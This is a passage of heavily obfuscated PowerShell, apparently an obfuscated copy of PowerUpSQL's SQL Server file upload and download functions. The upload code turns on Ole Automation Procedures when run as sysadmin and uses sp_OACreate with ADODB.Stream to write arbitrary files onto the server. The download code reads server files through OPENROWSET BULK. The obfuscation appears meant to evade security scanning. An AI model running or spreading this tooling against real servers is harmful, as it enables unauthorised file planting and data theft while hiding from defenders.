        HELPMeSsAGE = {"{6}{5}{10}{4}{8}{3}{9}{0}{2}{7}{1}"-f'ed ','server.','to tar','be','l','t ','Inpu','get ','e to ',' upload','local fi'})]
        [ValidateScript({
                    &("{1}{0}" -f 'h','Test-Pat') ${_} -PathType ("{0}{1}" -f 'lea','f')
        })]
        [String]${InPU`TFI`Le} = "",

        [Parameter(MaNDATorY = ${t`RUE},
        HELPMesSAgE = {"{5}{3}{18}{12}{1}{10}{6}{17}{7}{11}{2}{16}{0}{14}{15}{9}{8}{4}{13}" -f 'ou','n','re the file','stinat',' serve','De',' pa','h','ed on the remote','oad',' file','e','o','r.','ld b','e upl',' sh','th w','i'})]
        [String]${Ou`TpUtfi`Le} = "",

        [Parameter(MANDaTORY = ${F`ALse},
        hELPMEsSAge = {"{4}{0}{3}{2}{1}"-f'nec','timeout.','n ','tio','Con'})]
        [string]${Tim`EOuT},

        [Parameter(mAndATorY = ${fAL`Se},
        heLPMESSaGE = {"{0}{5}{3}{1}{4}{2}"-f'N','h','.',' t','reads','umber of'})]
        [int]${THrea`ds} = 1,

        [Parameter(mANdatory = ${F`ALSE},
        helpMeSsage = {"{6}{9}{5}{0}{7}{4}{10}{2}{3}{1}{8}" -f ' ','rappe',' fu','nction is w','ed wh','s verbose','Supp','errors.  Us','d.','res','en'})]
        [switch]${S`Upp`ReSsv`Er`Bose}
    )

    Begin
    {
        
        ${T`BLCOmM`An`Ds} = &("{2}{1}{0}"-f'ect','Obj','New-') -TypeName ("{1}{0}{4}{2}{3}" -f'Data.Da','System.','abl','e','taT')
        ${Tblr`E`SU`ltS} = &("{1}{2}{0}" -f 'ect','New-Ob','j') -TypeName ("{3}{1}{0}{2}" -f 'ata.DataTab','D','le','System.')
        ${n`Ull} = ${t`B`lrEsULtS}."C`OlUM`NS".("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{0}{3}" -f 'terNa','ompu','C','me'))
        ${NU`LL} = ${T`Bl`ResultS}."COlu`M`NS".("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{0}"-f'nce','Inst','a'))
        ${Nu`ll} = ${t`BlRESuL`TS}."c`Ol`UmnS".("{1}{0}"-f'd','Ad').Invoke(("{3}{2}{1}{0}" -f'esults','R','pload','U'))


        
        ${PipeLI`N`eit`e`mS} = &("{1}{0}{2}{3}" -f'ew-O','N','bjec','t') -TypeName ("{1}{3}{5}{2}{0}{4}{6}"-f 'ta','System.D','.Da','at','Ta','a','ble')

        
        if(-not ${INS`T`AnCe})
        {
            ${IN`StaN`cE} = ${ENV:C`OM`PU`TeR`N`AME}
        }

        
        if(${In`ST`An`CE})
        {
            ${pRovi`DEInS`Ta`N`CE} = &("{1}{0}{2}"-f'e','New-Obj','ct') -TypeName ("{1}{2}{0}"-f 'ect','PSO','bj') -Property @{
                ("{1}{2}{0}"-f 'tance','In','s') = ${i`NS`TAncE}
            }
        }

        
        ${PIp`EL`Inei`T`eMS} = ${PIp`E`liNe`iTEMs} + ${pr`oVi`d`eInsTAnCE}
    }

    Process
    {
        
        ${Pi`PELIN`eiTemS} = ${p`ipeliN`eI`TeMS} + ${_}
    }

    End
    {
        
        ${mysCR`I`ptbL`OCk} = {
            ${I`N`StaNCE} = ${_}."In`sTA`Nce"

            
            ${CoM`p`UT`ER`Name} = &("{5}{7}{3}{1}{2}{6}{0}{4}"-f'nsta','t','erNameFrom','-Compu','nce','Ge','I','t') -Instance ${ins`Tan`cE}

            
            if(-not ${IN`sTA`NCE})
            {
                ${INS`T`ANCE} = ${env`:`computE`RNaMe}
            }

            
            if(${d`AC})
            {
                
                ${CO`Nn`eCTIon} = &("{3}{1}{2}{0}{4}" -f'je','ect','ionOb','Get-SQLConn','ct') -Instance ${iNst`AN`Ce} -Username ${Use`RN`AME} -Password ${p`A`sSwo`Rd} -Credential ${C`ReDenTI`Al} -DAC -TimeOut ${T`I`mEouT}
            }
            else
            {
                
                ${CO`Nn`EC`TioN} = &("{4}{3}{5}{0}{2}{1}" -f 'Obj','ct','e','SQLConnecti','Get-','on') -Instance ${iNs`T`AncE} -Username ${U`se`RName} -Password ${pAs`sWO`Rd} -Credential ${c`ReD`EnTi`Al} -TimeOut ${t`IME`oUt}
            }

            
            try
            {
                
                ${C`ONNE`CtI`oN}.("{1}{0}"-f 'n','Ope').Invoke()

                if(-not ${s`U`pPress`VERb`OSe})
                {
                    &("{2}{3}{1}{4}{0}"-f 'bose','e','Wri','t','-Ver') -Message ("$Instance "+': '+'C'+'onnection'+' '+'Suc'+'ce'+'ss.')
                }

                
                ${DiS`ABlESh`ow`ADVanCEDo`PtioNS} = 0
                ${dI`SABLeO`lE} = 0

                
                ${ISsy`Sa`dMIN} = &("{4}{3}{1}{5}{2}{0}" -f 'ck','-SQLSy','he','t','Ge','sadminC') -Instance ${i`NSt`AncE} -Credential ${cr`eD`eNT`ial} -Username ${USE`R`N`Ame} -Password ${pas`s`wORd} -SuppressVerbose | &("{3}{2}{0}{1}" -f 'ct-Ob','ject','ele','S') -Property ("{2}{3}{1}{0}" -f'admin','s','Is','Sy') -ExpandProperty ("{2}{0}{1}" -f 'd','min','IsSysa')

                
                if(${is`sYsAD`mIn} -eq 'Yes')
                {
                    &("{3}{1}{2}{0}"-f 'rbose','e','-Ve','Writ') -Message ("$Instance "+': '+'You'+' '+'a'+'re '+'a '+'s'+'y'+'sadm'+'in.')
                    ${IsOLe`e`Nab`LEd} = &("{0}{3}{1}{2}" -f'Get-SQL','er','y','Qu') -Instance ${i`Ns`TaNCE} -Query ((("{2}{6}{0}{8}{3}{4}{5}{1}{7}" -f ' vygOl','e','sp_con','m','ation Proce','dur','figure','svyg','e Auto'))."rE`pLace"(([cHAr]118+[cHAr]121+[cHAr]103),[stRINg][cHAr]39)) -Username ${Us`ER`N`Ame} -Password ${pa`ss`wOrD} -Credential ${crE`den`TiaL} -SuppressVerbose | &("{4}{2}{3}{0}{1}" -f 'je','ct','t','-Ob','Selec') -Property ("{1}{0}{3}{2}"-f 'nfi','co','ue','g_val') -ExpandProperty ("{0}{2}{1}"-f 'config_va','e','lu')
                    ${ISsHO`wad`Va`NceDeNa`BleD} = &("{2}{1}{0}" -f'Query','-SQL','Get') -Instance ${I`NStAN`CE} -Query ((("{0}{8}{6}{9}{12}{2}{4}{1}{11}{10}{7}{5}{3}"-f 'sp','Adv','e','uY',' SuYShow ','onsS','onfi','i','_c','gu','ced Opt','an','r'))."rE`pL`ACE"(([chAR]83+[chAR]117+[chAR]89),[sTRINg][chAR]39)) -Username ${u`SERNA`ME} -Password ${PAsS`W`OrD} -Credential ${CreDe`N`Ti`Al} -SuppressVerbose | &("{3}{2}{1}{0}"-f 'ct','Obje','t-','Selec') -Property ("{1}{0}{2}"-f'ig_v','conf','alue') -ExpandProperty ("{1}{0}{2}{3}" -f 'fig_','con','v','alue')
                }
                else
                {
                    &("{0}{1}{2}{3}"-f 'W','rite-','V','erbose') -Message ("$Instance "+': '+'You'+' '+'are'+' '+'n'+'ot '+'a '+'sys'+'a'+'dmin. '+'Th'+'is '+'comm'+'and '+'re'+'quires'+' '+'sy'+'sadmin '+'pr'+'iv'+'il'+'eges.')

                    
                    ${N`UlL} = ${tbLr`e`su`ltS}."r`ows".("{1}{0}"-f'dd','A').Invoke("$ComputerName","$Instance",("{2}{5}{0}{4}{3}{1}"-f 'admi','.','No ','es','n privileg','sys'))
                    return
                }

                
                if (${is`Sh`oWadVaNcEd`enableD} -eq 1)
                {
                    &("{2}{1}{0}{3}" -f 'e-','t','Wri','Verbose') -Message ("$Instance "+': '+'S'+'how '+'A'+'dvance'+'d '+'Opt'+'ions'+' '+'is'+' '+'alread'+'y '+'ena'+'bled'+'.')
                }
                else
                {
                    &("{3}{0}{2}{1}" -f'te-Verbo','e','s','Wri') -Message ("$Instance "+': '+'Show'+' '+'A'+'d'+'va'+'nced '+'O'+'ptio'+'ns '+'is'+' '+'disab'+'l'+'ed.')
                    ${d`IsAbl`Esho`WAdvAn`ceDopt`i`oNs} = 1

                    
                    &("{1}{2}{0}" -f't-SQLQuery','G','e') -Instance ${iNS`Ta`NcE} -Query ((("{6}{0}{5}{8}{4}{3}{1}{2}{7}" -f '_c','ed',' OptionsfNx,1;RE','dvanc','ure fNxShow A','o','sp','CONFIGURE','nfig'))  -CrEPLacE'fNx',[cHAr]39) -Username ${u`SERNAME} -Password ${pa`ssWo`RD} -Credential ${cR`ED`EntI`Al} -SuppressVerbose

                    
                    ${ISSH`oW`Ad`V`An`ce`dENaBLEd2} = &("{1}{0}{2}{3}" -f 'SQLQ','Get-','ue','ry') -Instance ${iN`sTAN`cE} -Query ((("{0}{4}{5}{3}{7}{1}{6}{2}"-f 'sp_con','anced Optio','Nj',' Ad','figu','re YNjShow','nsY','v'))."r`EplacE"(([ChAr]89+[ChAr]78+[ChAr]106),[stRINg][ChAr]39)) -Username ${us`Er`NAmE} -Password ${pA`ss`wOrD} -Credential ${CrEDE`N`TIAL} -SuppressVerbose | &("{3}{1}{0}{2}"-f 'ct-Obje','e','ct','Sel') -Property ("{0}{2}{1}" -f'c','ig_value','onf') -ExpandProperty ("{2}{1}{0}" -f'_value','onfig','c')

                    if (${iSs`HOW`Adv`AN`CEDenaB`lED2} -eq 1)
                    {
                        &("{2}{1}{0}"-f'e','e-Verbos','Writ') -Message ("$Instance "+': '+'Enab'+'led'+' '+'Sho'+'w '+'Adva'+'n'+'ced '+'O'+'ptions'+'.')
                    }
                    else
                    {
                        &("{1}{0}{2}"-f'-Verb','Write','ose') -Message ("$Instance "+': '+'Ena'+'bling'+' '+'S'+'how '+'Adva'+'nced'+' '+'O'+'ptions'+' '+'fail'+'ed.'+' '+'Abortin'+'g.')

                        
                        ${nU`ll} = ${tbLr`esUl`Ts}."R`OWs".("{0}{1}"-f'A','dd').Invoke("$ComputerName","$Instance",("{4}{1}{2}{5}{6}{7}{0}{3}" -f 'd','e','na',' Options.','Could not ','ble Sho','w A','dvance'))
                        return
                    }
                }

                
                if (${I`sOle`eN`ABLed} -eq 1)
                {
                    &("{2}{1}{0}" -f'erbose','e-V','Writ') -Message ("$Instance "+': '+'Ole'+' '+'A'+'uto'+'mati'+'on '+'Proc'+'e'+'dure'+'s '+'a'+'re '+'a'+'lready'+' '+'en'+'ab'+'led.')
                }
                else
                {
                    &("{1}{2}{0}" -f '-Verbose','Wr','ite') -Message ("$Instance "+': '+'Ol'+'e '+'Auto'+'mat'+'ion '+'Proc'+'edur'+'es '+'a'+'re '+'dis'+'ab'+'led.')
                    ${dIS`A`BLeO`lE} = 1

                    
                    &("{1}{2}{0}"-f 'ery','Get-','SQLQu') -Instance ${I`NSta`Nce} -Query ((("{6}{8}{5}{7}{9}{1}{3}{0}{4}{2}" -f'1;RECONFI','n Procedures3','E','qK,','GUR','3qKOl','sp_config','e Automat','ure ','io')) -RePlACe  '3qK',[ChAr]39) -Username ${U`se`RN`Ame} -Password ${pA`ssW`OrD} -Credential ${CR`eDEN`TI`AL} -SuppressVerbose

                    
                    ${ISOL`E`enA`BleD2} = &("{1}{2}{0}" -f'y','Get-SQLQ','uer') -Instance ${i`N`StaNce} -Query ((("{10}{11}{3}{6}{1}{7}{9}{0}{5}{4}{8}{2}"-f' P','Ole Aut','0}','{','ced','ro','0}','omati','ures{','on','sp_configu','re '))  -F [chAr]34) -Username ${u`Se`Rn`AMe} -Password ${p`ASSWord} -Credential ${cR`Ede`N`TIAl} -SuppressVerbose | &("{0}{2}{1}{3}" -f'Select-Obj','c','e','t') -Property ("{1}{2}{0}{3}"-f 'alu','conf','ig_v','e') -ExpandProperty ("{2}{0}{1}"-f'onfig_valu','e','c')

                    if (${iSo`LEENa`B`l`eD2} -eq 1)
                    {
                        &("{0}{1}{3}{2}"-f 'Wr','it','bose','e-Ver') -Message ("$Instance "+': '+'Ena'+'bl'+'ed '+'Ole'+' '+'Aut'+'oma'+'ti'+'on '+'Procedur'+'es'+'.')
                    }
                    else
                    {
                        &("{2}{1}{0}"-f 'Verbose','te-','Wri') -Message ("$Instance "+': '+'Ena'+'bl'+'i'+'ng '+'Ole'+' '+'Automa'+'t'+'i'+'on '+'Proc'+'edure'+'s'+' '+'fail'+'ed'+'. '+'Abort'+'ing'+'.')

                        
                        ${n`ULl} = ${T`BLRe`SULTS}."r`ows".("{0}{1}"-f 'A','dd').Invoke("$ComputerName","$Instance",("{8}{6}{0}{4}{7}{1}{2}{3}{5}"-f't ',' ','Automatio','n Proc','enable O','edures.','ould no','le','C'))

                        return
                    }
                }

                ${iN`P`U`TFIl`EFuLl} = (&("{1}{0}{2}" -f 't-Ite','Ge','m') ${i`NP`UTfilE})."f`UlLnA`mE"
                &("{1}{4}{0}{3}{2}" -f 'er','wr','ose','b','ite-v') ("$instance "+': '+'Re'+'a'+'ding '+'inp'+'ut '+'file:'+' '+"$InputFileFull")
                try
                {
                    ${F`iLEBYT`Es} =   (get-item variablE:8zM90G  ).VAlUe::("{2}{3}{1}{0}" -f's','AllByte','R','ead').Invoke(${iNp`UT`FIL`E`FUll})
                    ${f`I`LeDatA`Tmp} =   $lcS2::("{1}{0}"-f 'g','ToStrin').Invoke(${fi`LEBy`TeS})
                    ${F`Il`EDATa} = (${fi`lEd`Ata`TMp} -replace "\-", "")
                }
                catch
                {
                    if(-not ${sUppR`E`sSVeRBoSe})
                    {
                        ${ERROrM`e`sSa`ge} = ${_}."Ex`cEP`TIoN"."ME`sSaGe"
                        &("{3}{0}{2}{1}" -f 'te-Ve','se','rbo','Wri') ('Coul'+'d '+'n'+'ot '+'re'+'ad '+'i'+'nput'+' '+'fi'+'l'+'e: '+"$ErrorMessage")
                    }

                    
                    ${Nu`LL} = ${tbLr`E`SuLTs}."rO`ws".("{1}{0}" -f 'd','Ad').Invoke("$ComputerName","$Instance",("{4}{2}{6}{5}{3}{0}{1}" -f'rea','d.',' file co','be ','Input','ld not ','u'))
                }

                
                &("{2}{1}{0}" -f'se','erbo','write-v') "$instance : Uploading $($FileBytes.Length) bytes to: $OutputFile "           
                ${q`Ue`Ryf`i`LeuPlOaD} = 
(('{0'+'}'+'
DECLAR'+'E'+' ')  -f[cHAr]34+'@o'+'b '+'INT;
'+'E'+'X'+'EC '+'sp_OAC'+'rea'+'t'+'e '+(('EXCA'+'D'+'ODB.S'+'tr'+'eamE'+'XC, ')  -RepLaCe([ChAR]69+[ChAR]88+[ChAR]67),[ChAR]39)+'@'+'ob '+'O'+'UTPUT'+';
EXEC '+'sp_'+'OA'+'S'+'etPro'+'perty'+' '+'@'+'ob, '+('{'+'0}Type'+'{0}'+', ')  -f[CHAr]39+'1;'+'
EXE'+'C '+'sp_OA'+'Me'+'th'+'od '+'@o'+'b, '+('{0}Open{0};'+'
'+'EXE'+'C ')  -f  [CHaR]39+'sp_O'+'A'+'Meth'+'od '+'@o'+'b, '+('{0}W'+'rite{0}, ')-F [ChAr]39+'NULL,'+' '+('0'+'x{0}Fi'+'leData;
E'+'X'+'EC'+' ') -F [char]36+'s'+'p_O'+'AMethod '+'@o'+'b, '+('{'+'0}S'+'aveT'+'oFile{0}'+', ')  -F  [cHAR]39+'N'+'ULL, '+('{0'+'}{1}O'+'u'+'t'+'putFile{0'+'},'+' ') -f [char]39,[char]36+'2;
E'+'XEC'+' '+'s'+'p_OAM'+'eth'+'od '+'@ob,'+' '+('{0'+'}Close{'+'0};'+'
E'+'XEC ')  -F  [chaR]39+'s'+'p_OADest'+'roy '+('@'+'ob;
'+'I0H')."r`EP`LaCE"(([cHar]73+[cHar]48+[cHar]72),[strInG][cHar]34))

                
                ${Nu`LL} = &("{2}{0}{1}" -f'SQLQ','uery','Get-') -Instance ${InSt`ANCe} -Query ${q`UEryf`iLeU`p`lOad} -Username ${Us`Er`NaME} -Password ${PAS`sW`orD} -Credential ${cR`eD`ent`IAL} -SuppressVerbose 

                
                ${q`UERYCHEck`F`ILeExI`Sts} = ('EX'+'EC '+'ma'+'ste'+'r'+'..xp'+'_'+'fileexist'+' '+"'$OutputFile' "+'W'+'ITH '+'RE'+'SULT '+'SET'+'S '+'((fil'+'eexis'+'t'+'s '+'bi'+'t, '+'file'+'isdi'+'recto'+'r'+'y '+'bit,'+' '+'par'+'en'+'tdirect'+'or'+'yexis'+'ts '+'bit'+'))')

                
                ${C`m`DReSu`LTS} = &("{1}{3}{2}{0}" -f'ery','Get-S','LQu','Q') -Instance ${I`NsTaNCe} -Query ${qU`e`RYChEC`kFiL`EExIStS} -Username ${u`SE`RNaME} -Password ${pasSW`O`Rd} -Credential ${cre`DEN`T`iAL} -SuppressVerbose | &("{0}{3}{4}{2}{1}" -f'Sele','t','ec','c','t-Obj') -Property ("{0}{2}{1}"-f'file','ists','ex') -ExpandProperty ("{0}{2}{1}"-f'fi','s','leexist')

                if (${CmD`REs`Ul`Ts} -eq ${Tr`Ue})
                {
                    &("{3}{0}{1}{2}"-f 'r','it','e-Verbose','W') -Message ("$Instance "+': '+'Su'+'ccess.'+' '+'F'+'ile '+'upl'+'oaded'+'.')
                }
                else
                {
                    &("{0}{3}{2}{1}"-f'Wr','e','bos','ite-Ver') -Message ("$Instance "+': '+'F'+'ail'+'ure. '+'Fi'+'le '+'N'+'OT '+'uplo'+'a'+'ded.')
                }

                
                ${n`Ull} = ${tbl`RESuL`TS}."RO`ws"."A`dd"(${cO`Mp`Ut`ERn`Ame}, ${I`NsT`A`NCE}, [string]${CMD`R`esultS})

                
                if(${d`IS`Abl`eOlE} -eq 1)
                {
                    &("{1}{3}{2}{0}{4}" -f'e-Verb','Wr','t','i','ose') -Message ("$Instance "+': '+'D'+'isa'+'bling '+(('P'+'O2Ol'+'e ') -creplACe([cHaR]80+[cHaR]79+[cHaR]50),[cHaR]39)+'Au'+'tom'+'ation'+' '+'P'+'roce'+'dures')
                    &("{1}{3}{2}{0}" -f 'ery','G','-SQLQu','et') -Instance ${INst`AN`CE} -Query ((("{0}{4}{3}{5}{12}{11}{1}{10}{13}{14}{2}{8}{9}{7}{15}{6}"-f 's',' {0}Ole A','r','con','p_','f','FIGURE','res{','oc','edu','uto','gure','i','mat','ion P','0},0;RECON')) -f  [CHaR]39) -Username ${Us`eRN`AMe} -Password ${pasS`wo`Rd} -Credential ${creD`e`NtiAL} -SuppressVerbose
                }

                
                if(${DisAbl`eSh`oWaD`V`AnCe`do`PtIons} -eq 1)
                {
                    &("{2}{0}{1}"-f'te-','Verbose','Wri') -Message ("$Instance "+': '+'Disabl'+'i'+'ng '+'Sho'+'w '+'Adv'+'anced '+'Optio'+'ns')
                    &("{3}{2}{0}{1}"-f 'uer','y','SQLQ','Get-') -Instance ${I`NsT`AnCE} -Query ((("{3}{7}{6}{0}{2}{8}{10}{1}{13}{12}{4}{5}{11}{9}" -f 'so','ced ','Show ','s','RECONFIG','U',' b','p_configure','A','E','dvan','R','ionsbso,0;','Opt'))."RepL`ACe"('bso',[StrINg][ChaR]39)) -Username ${Us`E`RnaMe} -Password ${pASS`WoRD} -Credential ${cREd`EN`Tial} -SuppressVerbose
                }

                
                ${co`N`NEc`TiON}.("{1}{0}" -f 'lose','C').Invoke()

                
                ${ConnEc`Ti`ON}.("{0}{2}{1}"-f 'Di','e','spos').Invoke()
            }
            catch
            {
                

                if(-not ${SUPpRe`ssVer`B`OsE})
                {
                    ${eRrO`R`Mess`Age} = ${_}."exc`ePTIoN"."M`essaGE"
                    &("{1}{3}{0}{2}{4}"-f'e','Write-','rbo','V','se') -Message ("$Instance "+': '+'C'+'on'+'nect'+'ion '+'F'+'ailed.')
                    
                }

                
                ${n`UlL} = ${TBL`RESU`ltS}."ro`ws".("{1}{0}"-f 'd','Ad').Invoke("$ComputerName","$Instance",("{3}{5}{1}{0}{2}{4}"-f'or Co','e ','mma','Not Accessib','nd Failed','l'))
            }
        }

        
        ${pIPe`LIne`ITEMs} | &("{2}{1}{3}{0}" -f 'l','arall','Invoke-P','e') -ScriptBlock ${mYs`Cri`ptb`lo`Ck} -ImportSessionFunctions -ImportVariables -Throttle ${ThR`e`Ads} -RunspaceTimeout 2 -Quiet -ErrorAction ("{1}{0}{2}{3}"-f 'ilently','S','Cont','inue')

        return ${tbL`R`esultS}
    }
}








Function  I`NVOke`-SQld`OwnlOaDFile
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNdAtorY = ${FA`LSe},
        HELPmESSagE = {"{2}{4}{10}{0}{9}{3}{5}{7}{1}{6}{8}" -f'or d','cat','SQL Serve','in account','r',' to ','e with','authenti','.','oma',' '})]
        [string]${Us`eR`NamE},

        [Parameter(MAnDAtORY = ${Fa`LSe},
        HELpmeSsAge = {"{12}{8}{11}{7}{5}{9}{10}{4}{3}{6}{0}{1}{2}" -f 'sword to authenticate w','it','h.','unt ','in acco','Ser','pas',' ','Q','ver or dom','a','L','S'})]
        [string]${pA`sS`wOrd},

        [Parameter(MAndAToRY = ${F`AL`se},
        heLPmesSAGE = {"{2}{1}{0}{3}{4}{5}"-f 'ws c','o','Wind','re','denti','als.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRE`d`eN`TIAl} =   $0459M2::"eM`Pty",

        [Parameter(MAnDATOrY = ${Fal`Se},
                VaLueFroMpIpelINe = ${t`Rue},
                VALUEfRompIPELineByprOPerTYNAme = ${T`Rue},
        hELPmESSagE = {"{5}{4}{1}{3}{2}{6}{0}"-f ' to.','nstance to ','ne','con','i','SQL Server ','ction'})]
        [string]${INSt`AnCE},

        [Parameter(mAnDaTORy = ${F`ALse},
        HElpMEssaGE = {"{7}{5}{0}{2}{6}{3}{4}{1}"-f 'using','ion.',' Dedicat','Admin ','Connect','nect ','ed ','Con'})]
        [Switch]${d`AC},

        [Parameter(mAndaTORy = ${tr`UE},
        HeLpmESsAGE = {"{10}{6}{4}{2}{0}{9}{12}{11}{13}{3}{5}{1}{7}{8}"-f 'w','SQL Server ','le to do','target',' fi',' ','ource','filesystem','.','n','S','a','lo','d from '})]
        [String]${soU`RC`EFI`Le} = "",

        [Parameter(MAndatory = ${T`RuE},
        hELPMESSaGe = {"{9}{11}{17}{7}{1}{3}{4}{8}{12}{5}{6}{16}{15}{10}{13}{0}{2}{18}{14}"-f ' fil','ve','e',' down','loade','e loc','al',' sa','d f','W','use','h','il','r','em.','he ','ly on t','ere to','syst'})]
        [String]${oUtpUT`FI`LE} = "",

        [Parameter(mAndaTory = ${fA`Lse},
        HelPMeSsage = {"{3}{4}{0}{2}{1}"-f'i','t.','on timeou','C','onnect'})]
        [string]${ti`MEo`UT},

        [Parameter(MANDatOrY = ${f`ALsE},
        HElpMESsAge = {"{0}{1}{2}{3}" -f 'Number ','of',' thre','ads.'})]
        [int]${t`hReADS} = 1,

        [Parameter(MAndAToRy = ${faL`SE},
        hElpmESsagE = {"{8}{13}{0}{4}{7}{1}{2}{15}{5}{14}{9}{3}{10}{16}{12}{6}{11}" -f'ess ve','erro','rs.  U',' fun','rbos','e','ra','e ','Sup','when','ctio','pped.','w','pr','d ','s','n is '})]
        [switch]${sUPPRe`S`SVe`RbO`SE}
    )

    Begin
    {
        
        ${TBlC`Omma`Nds} = &("{3}{0}{2}{1}" -f'ew-','ject','Ob','N') -TypeName ("{1}{2}{0}{3}{4}" -f'Da','System.Da','ta.','ta','Table')
        ${tBL`R`EsuL`Ts} = &("{1}{0}{2}" -f 'c','New-Obje','t') -TypeName ("{3}{0}{2}{1}"-f'y','able','stem.Data.DataT','S')
        ${N`ULl} = ${tblr`ES`UlTs}."CoLuM`NS".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}"-f'me','erNa','Comput'))
        ${NU`LL} = ${tb`lReS`U`Lts}."CO`Lum`Ns".("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}"-f'nce','nsta','I'))
        ${NU`lL} = ${TBL`Re`Sul`TS}."co`LuMNS".("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}{3}"-f 'Downlo','dRes','a','ults'))


        
        ${Pip`elIn`EITeMs} = &("{2}{3}{1}{0}"-f 'ect','Obj','N','ew-') -TypeName ("{4}{1}{3}{6}{0}{2}{5}" -f'D','tem.D','ataTabl','ata','Sys','e','.')

        
        if(-not ${inS`Ta`N`ce})
        {
            ${INs`T`A`NcE} = ${ENv`:`coMPutERnA`Me}
        }

        
        if(${in`st`Ance})
        {
            ${P`R`ovId`eiNS`TANCE} = &("{0}{1}{2}"-f 'New','-O','bject') -TypeName ("{1}{2}{0}" -f'ect','PSOb','j') -Property @{
                ("{2}{1}{0}" -f'ce','stan','In') = ${INst`A`NCe}
            }
        }

        
        ${P`IPe`LiNEITEMS} = ${p`I`pelIn`Eit`EMS} + ${PR`OvId`Ei`Ns`TANCe}
    }

    Process
    {
        
        ${pIpEl`I`Neit`EMS} = ${Pip`elI`N`eiteMs} + ${_}
    }

    End
    {
        
        ${m`yScR`ip`TBLOcK} = {
            ${I`NS`TanCe} = ${_}."InSTaN`CE"

            
            ${cOM`Pu`TE`R`NAMe} = &("{6}{3}{1}{0}{4}{8}{2}{7}{5}" -f'm','puterNameFro','a','-Com','Ins','e','Get','nc','t') -Instance ${in`s`TAnCE}

            
            if(-not ${inS`T`AN`CE})
            {
                ${i`NStaN`cE} = ${e`N`V:COM`PuT`e`RnAMe}
            }

            
            if(${D`AC})
            {
                
                ${c`O`NnECT`ion} = &("{3}{1}{0}{2}{4}" -f'e','t-SQLConn','ctionObj','Ge','ect') -Instance ${iNSTa`N`Ce} -Username ${U`s`ernaME} -Password ${Pa`S`s`wOrd} -Credential ${cr`e`DEnt`Ial} -DAC -TimeOut ${tI`m`EoUT}
            }
            else
            {
                
                ${c`O`Nn`EctION} = &("{0}{2}{3}{1}{4}" -f 'Get','nectionObje','-SQ','LCon','ct') -Instance ${i`Nsta`NCe} -Username ${U`se`Rn`AMe} -Password ${paSsw`O`Rd} -Credential ${C`REdeNTI`Al} -TimeOut ${tI`me`OUt}
            }

            
            try
            {
                
                ${cOn`Ne`c`TIon}.("{0}{1}" -f 'Ope','n').Invoke()

                if(-not ${SupP`R`ES`SvE`Rb`OSE})
                {
                    &("{3}{1}{0}{2}" -f'ite-Ver','r','bose','W') -Message ("$Instance "+': '+'Co'+'nnec'+'ti'+'on '+'Suc'+'ces'+'s.')
                }

                
                ${qUerYchec`K`F`ILE`e`X`ists} = ('EX'+'EC '+'maste'+'r..xp_f'+'i'+'l'+'eexist '+"'$SourceFile' "+'WI'+'TH '+'R'+'ESULT '+'SET'+'S '+'('+'('+'fileex'+'ists '+'bit,'+' '+'fil'+'e'+'is'+'dire'+'ctory '+'bi'+'t, '+'paren'+'td'+'irectoryex'+'ists'+' '+'b'+'it))')

                
                ${cmD`RES`UlTS} = &("{2}{0}{1}"-f'-','SQLQuery','Get') -Instance ${iN`St`ANCE} -Query ${qUerYChEckFIL`EeX`I`S`TS} -Username ${USer`N`AME} -Password ${Pa`sS`wOrd} -Credential ${c`R`EDEn`TIaL} -SuppressVerbose | &("{1}{2}{0}{3}"-f'ct-','Sel','e','Object') -Property ("{1}{0}{2}" -f'st','fileexi','s') -ExpandProperty ("{1}{2}{0}" -f'sts','file','exi')

                if (${cmdR`e`S`ULTs} -eq ${T`RUe})
                {
                    &("{1}{0}{2}"-f '-Ver','Write','bose') -Message ("$Instance "+': '+'Fi'+'le '+'e'+'xists. '+'At'+'te'+'m'+'pting '+'to'+' '+'down'+'lo'+'ad:'+' '+"$SourceFile")

                    ${QueR`yfil`edoWnl`OAd} = ('S'+'ELEC'+'T '+'* '+'FROM'+' '+'OPENROWSE'+'T'+'('+'BULK'+' '+"N'$SourceFile', "+'S'+'INGLE_BL'+'OB)'+' '+'rs')

                    
                    ${FiLe`By`T`ES} = &("{3}{1}{0}{2}" -f'ue','SQLQ','ry','Get-') -Instance ${iNsta`N`ce} -Query ${qU`eRyf`ILeDOwN`L`oad} -Username ${uSER`NamE} -Password ${pa`sswO`Rd} -Credential ${CrEde`NtI`Al} -SuppressVerbose | &("{2}{0}{1}" -f'le','ct-Object','Se') -Property ("{0}{2}{1}" -f'Bul','Column','k') -ExpandProperty ("{2}{1}{0}"-f'lumn','lkCo','Bu')

                    ${FILEBy`T`eSARr} = ${FI`l`EbYTES} -split ' '

                    &("{1}{2}{0}" -f'Verbose','Write','-') "$Instance : Downloaded. Writing $($FileBytesArr.Length) to $OutputFile... "

                    ${FiL`eCOnt`EN`TS} = (${fI`lEBYTe`S`ARR} | &('%') {[byte]  (  gEt-vaRiable  ('QM'+'RK') ).VAlUE::("{1}{0}" -f 'Int32','To').Invoke(${_})})

                     (  vARiaBLE 6P5eF0 ).ValUE::("{2}{3}{1}{0}"-f'es','t','WriteAll','By').Invoke(${O`Utp`UTFiLE}, ${fi`lecon`TeNtS})

                    ${n`ULl} = ${tBl`R`e`SulTS}."ro`ws".("{1}{0}"-f 'dd','A').Invoke("$ComputerName","$Instance",${Tr`UE})
                }
                else
                {
                    &("{0}{2}{1}"-f'Writ','-Verbose','e') -Message ("$Instance "+': '+'Fail'+'ure.'+' '+'Spe'+'cif'+'i'+'ed '+'f'+'ile '+'do'+'es '+'no'+'t '+'exis'+'t.')

                    ${N`ULl} = ${tb`Lre`SultS}."ro`Ws".("{1}{0}"-f'd','Ad').Invoke("$ComputerName","$Instance",("{1}{3}{0}{2}{4}{5}" -f'ce file ','So','d','ur','oes ','not exist'))
                }

                
                ${CO`N`N`ecTION}.("{0}{1}" -f 'Clos','e').Invoke()

                
                ${COn`N`ectiON}.("{0}{2}{1}" -f 'D','spose','i').Invoke()
            }
            catch
            {
                

                if(-not ${suPpR`Ess`V`erb`OsE})
                {
                    ${ERr`O`RmesS`Age} = ${_}."excE`pTION"."MeSS`AGE"
